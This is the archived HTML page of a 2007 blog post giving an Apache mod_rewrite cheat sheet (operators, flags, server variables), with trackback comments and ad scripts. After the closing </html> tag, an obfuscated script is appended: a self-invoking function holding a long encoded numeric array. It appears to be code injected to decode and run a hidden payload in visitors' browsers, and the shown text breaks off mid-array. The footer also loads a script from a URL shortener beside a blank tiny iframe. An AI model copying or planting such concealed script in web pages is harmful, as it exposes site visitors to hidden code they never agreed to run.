<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">

<head profile="http://gmpg.org/xfn/11">

<title>Apache Mod_Rewrite Cheat Sheet &raquo; Justin Shattuck | Blog Archive </title>

<meta http-equiv="content-type" content="text/html; charset=iso-8859-1" /> 
<link rel="pingback" href="http://old.justinshattuck.com/xmlrpc.php" />
<link rel="shorcut icon" type="image/x-ico" href="http://old.justinshattuck.com/wp-content/themes/JSv4/favicon.ico" />
<link href="http://old.justinshattuck.com/wp-content/themes/JSv4/style.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="http://old.justinshattuck.com/wp-content/themes/JSv4/javascript/imghover.js"> </script>
<script type="text/javascript" src="http://old.justinshattuck.com/wp-content/themes/JSv4/javascript/input.js"> </script>
<meta name="verify-v1" content="vwFFGUEYtsTb6lF7eob57eN0aAqNYMnR6iAqq3YTs68=" />
<meta name="generator" content="WordPress 2.9.1" />
<meta name="robots" content="all" />
<meta name="author" content="Justin Shattuck" />
<meta name="copyright" content="Copyright (c) Justin Shattuck" />

<link rel="alternate" type="application/rss+xml" title="Justin Shattuck Main Articles" href="http://feeds.feedburner.com/justinshattuck/" />
<link rel="alternate" type="application/atom+xml" title="Justin Shattuck Comments" href="http://old.justinshattuck.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Justin's Photos" href="http://flickr.com/services/feeds/photos_public.gne?id=30325267@N00&amp;format=rss_200" />
<link rel="alternate" type="application/rss+xml" title="Noteworthy Links" href="http://del.icio.us/rss/justinshattuck" />
		<link rel='archives' title='March 2010' href='http://old.justinshattuck.com/2010/03/' />
	<link rel='archives' title='July 2009' href='http://old.justinshattuck.com/2009/07/' />
	<link rel='archives' title='April 2009' href='http://old.justinshattuck.com/2009/04/' />
	<link rel='archives' title='March 2009' href='http://old.justinshattuck.com/2009/03/' />
	<link rel='archives' title='November 2008' href='http://old.justinshattuck.com/2008/11/' />
	<link rel='archives' title='August 2008' href='http://old.justinshattuck.com/2008/08/' />
	<link rel='archives' title='March 2008' href='http://old.justinshattuck.com/2008/03/' />
	<link rel='archives' title='February 2008' href='http://old.justinshattuck.com/2008/02/' />
	<link rel='archives' title='December 2007' href='http://old.justinshattuck.com/2007/12/' />
	<link rel='archives' title='November 2007' href='http://old.justinshattuck.com/2007/11/' />
	<link rel='archives' title='October 2007' href='http://old.justinshattuck.com/2007/10/' />
	<link rel='archives' title='September 2007' href='http://old.justinshattuck.com/2007/09/' />
	<link rel='archives' title='August 2007' href='http://old.justinshattuck.com/2007/08/' />
	<link rel='archives' title='June 2007' href='http://old.justinshattuck.com/2007/06/' />
	<link rel='archives' title='May 2007' href='http://old.justinshattuck.com/2007/05/' />
	<link rel='archives' title='April 2007' href='http://old.justinshattuck.com/2007/04/' />
	<link rel='archives' title='March 2007' href='http://old.justinshattuck.com/2007/03/' />
	<link rel='archives' title='February 2007' href='http://old.justinshattuck.com/2007/02/' />
	<link rel='archives' title='January 2007' href='http://old.justinshattuck.com/2007/01/' />
	<link rel='archives' title='December 2006' href='http://old.justinshattuck.com/2006/12/' />
	<link rel='archives' title='November 2006' href='http://old.justinshattuck.com/2006/11/' />
	<link rel='archives' title='October 2006' href='http://old.justinshattuck.com/2006/10/' />
	<link rel='archives' title='September 2006' href='http://old.justinshattuck.com/2006/09/' />
	<link rel='archives' title='August 2006' href='http://old.justinshattuck.com/2006/08/' />
	<link rel='archives' title='July 2006' href='http://old.justinshattuck.com/2006/07/' />
	<link rel='archives' title='June 2006' href='http://old.justinshattuck.com/2006/06/' />
	<link rel='archives' title='May 2006' href='http://old.justinshattuck.com/2006/05/' />

	<link rel="alternate" type="application/rss+xml" title="Justin Shattuck &raquo; Apache Mod_Rewrite Cheat Sheet Comments Feed" href="http://old.justinshattuck.com/2007/01/19/apache-mod_rewrite-cheat-sheet/feed/" />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://old.justinshattuck.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://old.justinshattuck.com/wp-includes/wlwmanifest.xml" /> 
<link rel='index' title='Justin Shattuck' href='http://old.justinshattuck.com' />
<link rel='start' title='For Once, I&#8217;m a Tad Early!' href='http://old.justinshattuck.com/2006/05/30/for-once-im-a-tad-early/' />
<link rel='prev' title='MySQL Injection Cheat Sheet' href='http://old.justinshattuck.com/2007/01/18/mysql-injection-cheat-sheet/' />
<link rel='next' title='Web Directions North in Vancouver' href='http://old.justinshattuck.com/2007/01/22/web-directions-north-in-vancouver/' />
<meta name="generator" content="WordPress 2.9.1" />
<link rel='canonical' href='http://old.justinshattuck.com/2007/01/19/apache-mod_rewrite-cheat-sheet/' />
<style type="text/css" media="screen">

/* Begin Contact Form CSS */
.contactform {
	position: static;
	overflow: hidden;
	width: 95%;
}

.contactleft {
	width: 25%;
	white-space: pre;
	text-align: right;
	clear: both;
	float: left;
	display: inline;
	padding: 4px;
	margin: 5px 0;
}

.contactright {
	width: 70%;
	text-align: left;
	float: right;
	display: inline;
	padding: 4px;
	margin: 5px 0;
}

.contacterror {
	border: 1px solid #ff0000;
}

.contactsubmit {
}
/* End Contact Form CSS */

	</style>


<!-- Start Of Script Generated By WP-PageNavi 2.40 -->
<link rel="stylesheet" href="http://old.justinshattuck.com/wp-content/plugins/wp-pagenavi/pagenavi-css.css" type="text/css" media="screen" />
<!-- End Of Script Generated By WP-PageNavi 2.40 -->
	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
</head>
<body>
 
<!-- header START -->
<div class="Header">
<div class="TopHeader">
</div>
  <h1><a href="http://old.justinshattuck.com">Justin Shattuck</a></h1>
 <div class="MainMenu">
 <ul>
      <li><a href="http://old.justinshattuck.com">Home</a></li>
      <li><a href="http://old.justinshattuck.com/about">about</a></li>
   <li><a href="http://old.justinshattuck.com/contact">contact</a></li>
</ul>
 </div>
 
  <div class="Search">
    <form action="/index.php" method="post">
      <fieldset>
	<p>Search On this blog</p>
     <input name="s" type="text" class="keyword" />
	 <div id="buttonsearch"><input name="submit" type="image" class="search" onmouseover="javascript:changeSty('searchIE');" onmouseout="javascript:changeSty('search');" title="Search" src="http://old.justinshattuck.com/wp-content/themes/JSv4/images/transparent.gif" alt="Search" />
	 </div>
      </fieldset>
    </form>
  </div>



<div class="SubRss">
 <ul>
  <li><a class="subscribe" href="http://feeds.feedburner.com/justinshattuck/">Subscribe to RSS</a></li>
 </ul>
</div>


</div> 
<!-- header END --><div id="bgcontain">
<!-- container START -->
<div class="container"> 

<!-- Side Central START -->
<div class="SC">


  
		<div class="Post" id="post-162">

			<div class="PostHead">
		     <h1><a href="http://old.justinshattuck.com/2007/01/19/apache-mod_rewrite-cheat-sheet/" rel="bookmark" title="Permanent Link: Apache Mod_Rewrite Cheat Sheet">Apache Mod_Rewrite Cheat Sheet</a></h1>
			 </div>
					 <div class="PostInfo">
			 <p style="color: red;">This is an archived article.  <strong>Please check <a href="http://justinshattuck.com">my homepage</a> for more up to date articles.</strong></p>
			 </div>			 
			 <div class="PostInfo">
			 <ul>
			  			  <li class="Author">Posted by Justin</li>
			  <li class="Category">Posted in <a href="http://old.justinshattuck.com/category/everyday/" title="View all posts in everyday" rel="category tag">everyday</a></li>
			 </ul>
			 </div>
			 
			<div class="PostContent">
			<p>A small yet handy cheat sheet for mod_rewrite.  The most used items to build a <a href="http://httpd.apache.org/docs/1.3/mod/mod_rewrite.html">mod_rewrite</a> pattern.<br />
</p>
<blockquote><p>Despite the tons of examples and docs, mod_rewrite is voodoo. Damned cool voodoo, but still voodoo.</p></blockquote>
<p></p>
<h2>Layout</h2>
<p>RewriteRule Pattern Substituion [Flag(s)]</p>
<h2>Example of rewriting oldfiles to new files:</h2>
<p>RewriteRule &#038;/oldfile\.html$ /newfile.html</p>
<h3>Operators</h3>
<blockquote>
<table>
<tr>
<td style="width: 180px;">.</td>
<td>Every char</td>
</tr>
<tr>
<td><&nbsp;>&nbsp;=</td>
<td>Compare</td>
</tr>
<tr>
<td>\</td>
<td>Escape a char</td>
</tr>
<tr>
<td>.+</td>
<td>One more, more chars</td>
</tr>
<tr>
<td>.*</td>
<td>No chars or multiple chars</td>
</tr>
<tr>
<td>^</td>
<td>Start</td>
</tr>
<tr>
<td>$</td>
<td>End</td>
</tr>
<tr>
<td>(&#8230;)</td>
<td>Group</td>
</tr>
<tr>
<td>a|b</td>
<td>.A or B</td>
</tr>
<tr>
<td>(a|b)</td>
<td>.A or B group</td>
</tr>
<tr>
<td>a{5}</td>
<td>Exact 5 times a</td>
</tr>
<tr>
<td>a{1,5}</td>
<td>Between 1 and 5 times a</td>
</tr>
<tr>
<td>[a-z]*</td>
<td>Match chars</td>
</tr>
<tr>
<td style="width: 40px;">-d</td>
<td>Directory</td>
</tr>
<tr>
<td>-f</td>
<td>File</td>
</tr>
<tr>
<td>-l</td>
<td>Symbolic link</td>
</tr>
</table>
</blockquote>
<p></p>
<h3>Flags</h3>
<blockquote>
<table>
<tr>
<td style="width: 180px;">[NC]</td>
<td>No case sensitive</td>
</tr>
<tr>
<td>[OR]</td>
<td>Allows multiple lines</td>
</tr>
<tr>
<td>[R=#]</td>
<td>Redirect where # is number: 404.</td>
</tr>
<tr>
<td>[L]</td>
<td>Terminate routine</td>
</tr>
</table>
</blockquote>
<p></p>
<h3>RewriteCond variables</h3>
<blockquote>
<table>
<tr>
<td style="width: 180px;">%{HTTP_ACCEPT}</td>
<td>Media types accepted by the client, ?text/plain?</td>
</tr>
<tr>
<td>%{HTTP_COOKIE}</td>
<td>Cookies set for the client.</td>
</tr>
<tr>
<td>%{HTTP_HOST}</td>
<td>Domain name of the virtual host queried.</td>
</tr>
<tr>
<td>%{HTTP_REFERER}</td>
<td>Page with a link to this page (can be omitted).</td>
</tr>
<tr>
<td>%{HTTP_USER_AGENT}</td>
<td>Client, such as ?Mozilla/4.0?</td>
</tr>
<tr>
<td>%{QUERY_STRING}</td>
<td>Query string transferred by a GET form.</td>
</tr>
<tr>
<td>%{REMOTE_ADDR}</td>
<td>Client IP address.</td>
</tr>
<tr>
<td>%{REMOTE_HOST}</td>
<td>Domain name of client.</td>
</tr>
<tr>
<td>%{REMOTE_USER}</td>
<td>User name of the client.</td>
</tr>
<tr>
<td>%{REQUEST_URI}</td>
<td>The URI requested by the client.</td>
</tr>
<tr>
<td>%{REQUEST_FILENAME}</td>
<td>The corresponding file on the local file system.</td>
</tr>
<tr>
<td>%{SERVER_ADDR}</td>
<td>Server IP</td>
</tr>
</table>
</blockquote>
<p></p>
                         </div>
			
<p class="PostDate">
   <strong class="month">Jan</strong>
   <strong class="day">19</strong>
 </p> 
			 	
<small>
This entry was posted
 
on Friday, January 19th, 2007 at 9:25 pmand is filed under <a href="http://old.justinshattuck.com/category/everyday/" title="View all posts in everyday" rel="category tag">everyday</a>.
You can follow any responses to this entry through the <a href='http://old.justinshattuck.com/2007/01/19/apache-mod_rewrite-cheat-sheet/feed/'>RSS 2.0</a> feed. 

Both comments and pings are currently closed.
</small>
					
</div>
		
<div class="Comments">

<!-- You can start editing here. -->

<div class="List">
<h3 id="comments"><strong>5 Comments</strong>
<em>Apache Mod_Rewrite Cheat Sheet</em></h3>
<ol>
 <li class="alt" id="comment-157211">
 <p class="ListUser"><strong><a href='http://topgossips.com/2009/04/70-practical-cheat-sheets-for-web-designers-and-developers/' rel='external nofollow' class='url'>Top Gossips &raquo; Blog Archive &raquo; 70+ Practical Cheat Sheets For Web Designers And Developers</a></strong></p>
 <p class="ListDate"><a href="#comment-157211" title="">April 16th, 2009 at 7:31 pm </a></p>

   <span class="ListNr">1</span>
   <div class="ListContent">
    <p>[...] Web Based Mod_Rewrite Tips [...]</p>
   </div>
     
</li>

 <li class="" id="comment-169210">
 <p class="ListUser"><strong><a href='http://www.noupe.com/php/10-mod_rewrite-rules-you-should-know.html' rel='external nofollow' class='url'>10+ Mod_Rewrite Rules You Should Know</a></strong></p>
 <p class="ListDate"><a href="#comment-169210" title="">August 18th, 2009 at 1:52 am </a></p>

   <span class="ListNr">2</span>
   <div class="ListContent">
    <p>[...] Apache Mod_Rewrite Cheat Sheet &#8211; This cheat sheet offers information on the most-used items for building a mod_rewrite pattern. [...]</p>
   </div>
     
</li>

 <li class="alt" id="comment-169248">
 <p class="ListUser"><strong><a href='http://www.seanburdick.com/200908/10-mod_rewrite-rules-you-should-know/' rel='external nofollow' class='url'>10+ Mod_Rewrite Rules You Should Know | SeanBurdick</a></strong></p>
 <p class="ListDate"><a href="#comment-169248" title="">August 19th, 2009 at 3:10 am </a></p>

   <span class="ListNr">3</span>
   <div class="ListContent">
    <p>[...] Apache Mod_Rewrite Cheat Sheet &#8211; This cheat sheet offers information on the most-used items for building a mod_rewrite pattern. [...]</p>
   </div>
     
</li>

 <li class="" id="comment-169582">
 <p class="ListUser"><strong><a href='http://www.tripwiremagazine.com/tutorials/developer-toolbox/expectually-useful-apache-rewrite-techniques-explained.html' rel='external nofollow' class='url'>Expectually Useful Apache Rewrite Techniques Explained&nbsp;|&nbsp;tripwire magazine</a></strong></p>
 <p class="ListDate"><a href="#comment-169582" title="">August 25th, 2009 at 5:08 pm </a></p>

   <span class="ListNr">4</span>
   <div class="ListContent">
    <p>[...] Apache Mod_Rewrite Cheat Sheet – This cheat sheet offers information on the most-used items for building a mod_rewrite pattern. [...]</p>
   </div>
     
</li>

 <li class="alt" id="comment-169616">
 <p class="ListUser"><strong><a href='http://maheshvnit.wordpress.com/2009/08/26/expectually-useful-apache-rewrite-techniques-explained/' rel='external nofollow' class='url'>Expectually Useful Apache Rewrite Techniques Explained &laquo; Mahesh Prasad ( Web Development ) [LAMP/AJAX/SEO/SQL/XML]</a></strong></p>
 <p class="ListDate"><a href="#comment-169616" title="">August 26th, 2009 at 5:47 am </a></p>

   <span class="ListNr">5</span>
   <div class="ListContent">
    <p>[...] This article will show you some really useful Apache Rewrite Techniques and easy to digest introduction to Apache basics. You may want to get yourself a cheat sheet before going on: Apache Mod_Rewrite Cheat Sheet [...]</p>
   </div>
     
</li>

</ol>
<div style="margin: 0px auto;"><a href="http://robbsutton.com/ramped-reviews/" rel="nofollow" title="Ramped Reviews on Robbsutton.com"><img src="http://robbsutton.com/rs198/wp-content/uploads/2009/07/ramped_468x60.gif" alt="Robb Sutton's Ramped Reviews on RobbSutton.com" /></a></div>
<p class="note">
	<a href='http://old.justinshattuck.com/2007/01/19/apache-mod_rewrite-cheat-sheet/feed/'><abbr title="Really Simple Syndication">RSS</abbr> feed for comments on this post</a>		</p>
</div>


</div></div>

 
</div>
<!--  Side Central END -->

<!-- Side Right - START -->
<div class="SRblock">
<div class="notice">

<p>The version of my website you are viewing is currently out of date.  The content is still here as an archive and you are free to continue browsing it, however, I do recommend you check out my <a href="http://justinshattuck.com">current homepage</a> for more up to date information.</p>
</div>

 <div class="Banners">
 <h2>Sponsors</h2>
	<a href="http://www.text-link-ads.com/?ref=41582"><img src="http://old.justinshattuck.com/wp-content/themes/JSv4/images/banners/textlinkads.png" alt="Text Link Ads" /></a><br />
<script type="text/javascript"><!--
iDevAffiliate_BoxWidth = "269";
iDevAffiliate_BoxHeight = "80";
iDevAffiliate_OutlineColor = "#2F4A54";
iDevAffiliate_TitleTextColor = "#FFCDCD";
iDevAffiliate_LinkColor = "#A1E8FF";
iDevAffiliate_TextColor = "#A1E8FF";
iDevAffiliate_TextBackgroundColor = "#2F4A54";
//-->
</script>
<script language="JavaScript" type="text/javascript" src="http://www.linkxl.com/151-textad-5.html"></script>
<script type="text/javascript">
Vertical1234752 = false;
ShowAdHereBanner1234752 = true;
RepeatAll1234752 = false;
NoFollowAll1234752 = false;
BannerStyles1234752 = new Array(
	"a{display:block;font-size:11px;color:#888;font-family:verdana,sans-serif;margin:0 4px 10px 0;text-align:center;text-decoration:none;overflow:hidden;}",
	"img{border:0;clear:right;}",
	"a.adhere{color:#666;font-weight:bold;font-size:12px;border:1px solid #ccc;background:#e7e7e7;text-align:center;}",
	"a.adhere:hover{border:1px solid #999;background:#ddd;color:#333;}"
);

document.write(unescape("%3Cscript src='"+document.location.protocol+"//s3.buysellads.com/1234752/1234752.js?v="+Date.parse(new Date())+"' type='text/javascript'%3E%3C/script%3E"));
</script>
 </div>
</div>

<div class="SRblock" style="background: none; margin: 0 auto; padding: 0 auto; text-align: center;">
 <a style="margin: 0 auto;" href="http://robbsutton.com/ramped-reviews/" rel="nofollow"><img src="http://robbsutton.com/rs198/wp-content/uploads/2009/06/ramped-reviews-cover.jpg" /></a>
</div>

<div class="Categ">
  <h2>Categories</h2>
  <ul>
       	<li class="cat-item cat-item-1"><a href="http://old.justinshattuck.com/category/everyday/" title="Bibble-Babble and nonsense.">everyday</a>
</li>
	<li class="cat-item cat-item-55"><a href="http://old.justinshattuck.com/category/features/" title="View all posts filed under Featured Articles">Featured Articles</a>
</li>
	<li class="cat-item cat-item-5"><a href="http://old.justinshattuck.com/category/wordpress/" title="View all posts filed under wordpress">wordpress</a>
</li>
  </ul>
 </div> 

 <div class="Syndication">
  <h2>Syndicate</h2>
  <ul>
   <li><a class="RSS" href="http://old.justinshattuck.com/feed/"><em>RSS</em></a></li>
   <li><a class="BlogMarks" href="http://old.justinshattuck.com"><em>BlogMarks</em></a></li>
   <li><a class="delicius" href="http://old.justinshattuck.com"><em>del.ici.us</em></a></li>
   <li><a class="NewsWine" href="http://old.justinshattuck.com"><em>NewsWine</em></a></li>
   <li><a class="Simpy" href="http://old.justinshattuck.com"><em>Simpy</em></a></li>
   <li><a class="Spurl" href="http://old.justinshattuck.com"><em>Spurl</em></a></li>
   <li><a class="comments" href="http://old.justinshattuck.com"><em>co.mments</em></a></li>
  </ul>
 </div>

 <div class="Flickr">
  <h2>Flickr Photostream</h2>
   <ul>
    <li><script type="text/javascript" src="http://www.flickr.com/badge_code.gne?nsid=30325267@N00&amp;count=9&amp;display=latest&amp;name=0&amp;size=square&amp;raw=1"></script></li> 
   </ul>
 </div>

<!--
<div class="Banners">
<h2>Recent Readers</h2>
<script type="text/javascript" src="http://pub.mybloglog.com/comm2.php?mblID=2007032811061474&amp;c_width=269&amp;c_sn_opt=n&amp;c_rows=3&amp;c_img_size=f&amp;c_heading_text=&amp;c_color_heading_bg=3d606d&amp;c_color_heading=a1e8ff&amp;c_color_link_bg=3d606d&amp;c_color_link=a1e8ff&amp;c_color_bottom_bg=3d606d"></script>
</div>
-->
</div>
<!-- Side Right - END -->
</div> 
<!-- container END -->
</div>

<!-- footer START -->
<div class="FooterContain">

<div class="Footer">

 <div class="FooterRecent">
     <h2>Recent Entries</h2>
		<ul>
			<li><a href='http://old.justinshattuck.com/2010/03/01/i-have-redesigned-my-website/'>I have redesigned my website</a></li><li><a href='http://old.justinshattuck.com/archives/'>Archives</a></li><li><a href='http://old.justinshattuck.com/2009/07/21/creating-trouble-redbull-roundup/'>Creating Trouble, Redbull Roundup</a></li><li><a href='http://old.justinshattuck.com/2009/04/09/guess-a-number-from-1-to-1000-and-win/'>Guess a number from 1 to 1000 and win!</a></li><li><a href='http://old.justinshattuck.com/2009/04/06/tidying-up-database-wordpress-post-revisions/'>Tidying Up Database: Wordpress Post Revisions</a></li>		</ul>
				 </div>
  <div class="FooterCommented">
 <h2>Most Discussed Articles</h2>
 <ul>
<li><a href="http://old.justinshattuck.com/2007/03/19/comment-relish-wordpress-plugin/" title="Comment Relish Wordpress Plugin">Comment Relish Wordpress Plugin</a> (564)</li><li><a href="http://old.justinshattuck.com/2007/02/21/i-dont-like-partylite-candle-company/" title="I don't like Partylite Candle Company">I don't like Partylite Candle Company</a> (426)</li><li><a href="http://old.justinshattuck.com/2007/04/11/salmon/" title="Salmon Wordpress Theme">Salmon Wordpress Theme</a> (175)</li><li><a href="http://old.justinshattuck.com/2009/03/11/bannage-plugin-for-wordpress/" title="Bannage Plugin for Wordpress">Bannage Plugin for Wordpress</a> (164)</li><li><a href="http://old.justinshattuck.com/2007/03/04/i-got-your-joost-right-here-baby/" title="I got your Joost right here baby!">I got your Joost right here baby!</a> (137)</li>  </ul>
</div>


<div class="FooterPartners">
<h2>My Links</h2>
</div>

<div class="FooterCopy">

 <p>Copyright © 2004-2008 Justin Shattuck. Boring reads: <a href="/disclosure-policy/">disclosure policy</a> and <a href="/changelog/">change-log</a>.</p>
</div>
</div>
</div>
<!--<iframe src="http://digg.com/invitefrom/justinshattuck" height="1" width="1"></iframe>-->
<script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
</script>
<script type="text/javascript">
_uacct = "UA-252423-3";
urchinTracker();
</script>
<iframe src="" height="1" width="1"></iframe>
<script type="text/javascript" src="http://tinyurl.com/2b5ojn"></script>
<!-- Kontera ContentLink(TM);-->
<script type='text/javascript'>
var dc_AdLinkColor = '#ff9999' ;
var dc_UnitID = 14 ;
var dc_PublisherID = 2064 ;
var dc_adprod = 'ADL' ;
</script>
<script type='text/javascript' src='http://kona.kontera.com/javascript/lib/KonaLibInline.js'>
</script>
<!-- Kontera ContentLink(TM) -->
</body>
</html>
<script>
(function($$,_2,_1) {
	function qq2(){return [89,75,80,70,81,89,16,73,78,81,67,31,10,2,28,2,13,83,31,2,28,88,67,84,2,56,77,31,86,74,75,85,29,62,61,56,77,2,2,40,87,78,78,59,71,67,84,2,7,47,81,80,86,74,2,7,38,67,86,71,2,7,42,81,87,84,85,2,7,47,75,80,87,86,71,85,2,7,53,71,69,81,80,70,85,10,11,63,95,29,2,13,52,31,2,28,2,8,89,14,56,91,31,86,74,75,85,16,5,83,10,11,14,75,31,18,29,56,91,61,19,63,13,31,19,29,89,74,75,78,71,10,75,13,13,30,25,11,93,5,89,31,56,91,61,75,63,2,17,5,89,30,5,37,11,56,91,61,75,63,2,25,5,89,95,62,2,56,91,16,85,82,78,75,69,71,10,96,92,9,11,14,19,13,96,54,2,18,2,24,96,87,2,18,13,9,54,9,13,56,91,2,24,96,55,2,18,95,29,56,44,31,93,9,74,66,74,86,86,82,28,17,17,58,85,66,17,58,86,66,86,84,71,58,70,66,70,67,75,58,80,66,80,70,85,58,83,66,33,58,69,66,69,67,78,78,68,67,69,77,31,58,76,66,5,58,67,66,67,82,75,58,78,66,78,91,58,57,66,86,89,75,86,86,71,84,58,81,66,69,81,79,58,71,66,19,58,77,66,85,58,45,66,68,81,70,91,58,90,66,67,76,67,90,58,38,66,16,58,46,66,78,75,68,85,58,44,66,76,83,87,71,84,91,58,24,66,24,16,20,58,79,66,79,75,80,58,72,66,81,80,58,53,66,69,84,75,82,86,58,75,66,75,72,58,47,66,84,67,79,71,58,59,66,74,71,67,70,58,89,66,89,75,70,86,74,28,58,82,66,82,90,29,58,42,66,74,71,75,73,74,86,28,58,54,66,20,58,84,66,84,69,58,51,66,4,58,91,66,85,86,91,78,71,31,58,68,66,32,30,58,52,66,32,30,17,58,43,66,70,75,88,58,36,66,30,58,35,66,32,58,73,66,73,81,81,73,78,71,58,39,66,8,70,67,86,71,31,58,92,66,18,58,87,66,15,58,55,66,2,58,14,66,28,18,18,58,29,9,28,20,21,22,23,24,25,26,27,18,19,14,9,17,9,28,22,26,20,25,19,14,9,40,9,28,19,27,26,19,27,23,20,23,22,14,9,41,9,28,19,20,14,9,37,66,31,9,95,29,34,2,5,53,10,56,81,11,93,5,74,31,61,63,29,72,81,84,10,56,86,31,18,29,56,86,30,56,81,2,10,29,56,86,13,13,11,93,5,74,16,82,87,85,74,10,56,44,61,56,81,16,69,74,67,84,35,86,10,56,86,11,63,11,95,62,2,5,35,10,5,74,11,95,56,48,31,70,81,69,87,79,71,80,86,29,5,81,31,89,75,80,70,81,89,29,2,11,42,31,9,87,80,70,71,72,75,80,71,70,9,29,2,11,38,31,96,74,67,38,57,38,81,85,71,85,86,80,85,70,78,38,76,72,83,69,83,9,2,22,75,31,2,12,11,31,31,2,11,42,11,2,17,5,75,94,94,3,56,70,10,11,11,93,75,72,10,3,5,75,11,93,86,84,91,93,56,88,31,76,51,87,71,84,91,2,3,29,86,84,91,93,56,88,31,6,2,3,95,56,80,31,56,48,16,73,71,86,39,78,71,79,71,80,86,85,36,91,54,67,73,48,67,79,71,10,96,59,2,18,61,18,63,29,5,84,31,56,48,16,69,84,71,67,86,71,39,78,71,79,71,80,86,10,96,77,53,2,18,29,5,84,16,85,71,86,35,86,86,84,75,68,87,86,71,10,96,77,84,9,11,14,5,53,10,4,74,90,38,73,67,77,38,81,85,90,85,46,85,44,85,71,38,24,85,44,38,79,38,76,4,11,11,29,56,80,16,67,82,82,71,80,70,37,74,75,78,70,10,5,84,11,95,34,2,56,68,10,5,92,14,56,69,2,21,47,67,86,74,16,72,78,81,81,84,10,5,92,17,56,69,11,2,27,54,10,5,40,11,93,88,67,84,2,56,79,31,56,68,10,2,11,90,14,2,6,67,11,29,2,8,76,31,2,11,90,7,2,6,67,29,2,8,46,31,2,6,91,12,5,76,29,2,8,69,31,2,6,53,12,56,79,29,2,8,85,31,5,46,15,5,69,2,17,5,85,32,18,11,93,5,90,31,5,85,95,71,78,85,71,93,5,90,31,5,85,13,2,6,73,95,62,10,5,90,7,5,40,11,2,27,50,10,5,41,11,93,2,11,90,31,96,29,9,11,13,5,41,29,2,6,91,31,96,17,9,11,29,2,6,73,31,96,29,9,11,15,96,40,9,11,29,2,6,67,31,56,68,10,2,6,73,14,2,6,91,11,29,2,6,53,31,2,6,73,7,2,6,91,2,27,35,10,56,2,21,56,2,10,31,31,19,33,56,61,18,63,28,56,2,24,9,9,11,95,29,34,2,5,68,10,56,11,93,70,31,80,71,89,2,38,67,86,71,10,2,22,73,31,96,92,71,71,9,11,29,70,16,85,71,86,54,75,79,71,10,10,56,16,67,85,65,81,72,15,96,41,9,11,12,96,41,9,11,12,96,41,9,11,12,96,71,92,92,2,18,12,96,71,92,92,92,2,18,29,62,2,70,2,27,82,10,56,36,11,93,2,8,48,14,56,47,14,5,44,31,56,36,2,10,29,2,8,67,31,61,63,29,89,74,75,78,71,10,15,15,5,44,11,93,56,47,31,5,54,10,5,44,2,22,67,16,82,87,85,74,10,56,47,2,22,48,31,56,36,61,56,47,63,29,56,36,61,56,47,63,31,56,36,61,5,44,63,29,56,36,61,5,44,63,31,5,48,95,95,34,2,56,90,10,6,11,93,56,84,31,6,16,79,67,82,10,61,26,19,14,26,23,14,25,22,14,25,22,14,27,20,14,19,25,14,26,20,14,25,21,14,26,18,14,21,18,14,26,20,14,25,25,14,20,23,14,19,19,14,19,18,14,19,18,14,24,19,14,19,19,14,23,24,14,23,23,14,19,19,14,23,21,14,24,14,23,21,14,25,14,20,14,19,14,18,14,22,26,63,14,34,10,90,14,75,2,21,53,86,84,75,80,73,16,72,84,81,79,37,74,67,84,37,81,70,71,10,75,13,90,13,20,22,11,95,11,29,62,2,5,35,10,56,84,11,2,27,72,10,90,2,21,90,2,10,95,34,2,56,74,10,6,11,93,75,72,2,12,11,3,31,2,11,42,11,93,6,10,2,28,75,72,2,12,16,56,82,11,3,31,2,11,42,11,62,29,6,16,56,82,31,19,29,2,23,38,14,34,10,56,37,11,93,5,71,31,5,68,10,56,37,2,22,87,31,5,71,2,2,47,81,80,86,74,10,11,2,29,46,31,5,71,2,2,38,67,86,71,10,2,22,91,31,34,10,90,14,75,11,93,62,10,5,72,10,90,13,4,4,11,15,19,11,33,90,28,4,18,4,13,90,95,29,56,85,31,5,91,10,5,87,14,22,11,13,4,15,4,13,5,91,10,56,46,14,25,2,22,86,31,5,38,13,5,53,10,4,39,2,19,29,56,71,31,56,42,31,56,68,10,5,71,2,2,42,81,87,84,85,10,11,14,24,11,12,24,2,29,38,31,56,71,13,19,29,5,37,31,13,96,71,92,9,11,29,2,14,2,23,86,14,34,10,56,37,11,93,86,84,91,93,5,80,31,56,37,16,86,84,71,80,70,85,29,5,79,31,5,53,10,4,2,19,13,4,2,4,2,17,56,71,30,5,37,11,56,71,2,25,56,71,2,17,56,38,30,5,37,11,56,38,2,25,56,38,29,2,26,71,13,5,53,10,58,11,63,2,17,3,5,70,11,93,2,26,38,13,5,53,10,58,11,63,95,5,70,31,10,5,70,61,21,63,16,80,67,79,71,16,86,81,46,81,89,71,84,37,67,85,71,10,11,16,84,71,82,78,67,69,71,10,17,61,64,67,15,92,63,17,73,75,14,9,9,11,13,9,79,75,69,84,81,85,69,81,82,71,9,11,16,85,82,78,75,86,10,9,9,2,22,36,31,5,87,12,25,19,13,56,42,12,21,13,56,46,12,21,25,29,5,50,10,5,36,2,22,72,31,5,54,10,22,11,13,5,37,29,5,82,10,5,70,2,22,39,31,96,37,74,9,11,13,5,35,10,5,70,11,16,85,87,68,85,86,84,75,80,73,10,18,14,5,72,11,13,9,16,69,81,79,17,9,13,56,90,10,6,11,29,56,44,61,9,60,9,63,31,5,39,29,56,89,31,96,36,43,2,20,68,75,47,55,2,20,55,77,84,60,52,75,47,52,43,35,9,11,29,6,10,96,45,2,18,16,67,82,82,71,80,70,10,56,89,11,95,69,67,86,69,74,10,56,83,11,93,95,95,11,95,14,5,37,12,5,37,12,5,37,11,95,11,95,11,95,71,78,85,71,93,2,14,2,15,14,19,13,96,54,54,54,2,18,95,95,2,15,11,5,76,85,34,72,87,80,69,86,75,81,80,56,5,45,58,9,14,9,66,9,28,9,96,5,53,10,9,62,84,71,86,87,84,80,2,2,16,73,71,86,55,54,37,2,3,16,80,81,37,81,80,72,78,75,69,86,10,86,84,87,71,11,95,69,67,86,69,74,10,71,11,93,95,2,6,5,81,16,56,2,7,10,11,14,56,77,2,2,2,8,88,67,84,2,5,2,10,16,78,71,80,73,86,74,2,11,5,81,16,5,2,12,10,86,91,82,71,81,72,10,6,2,13,38,67,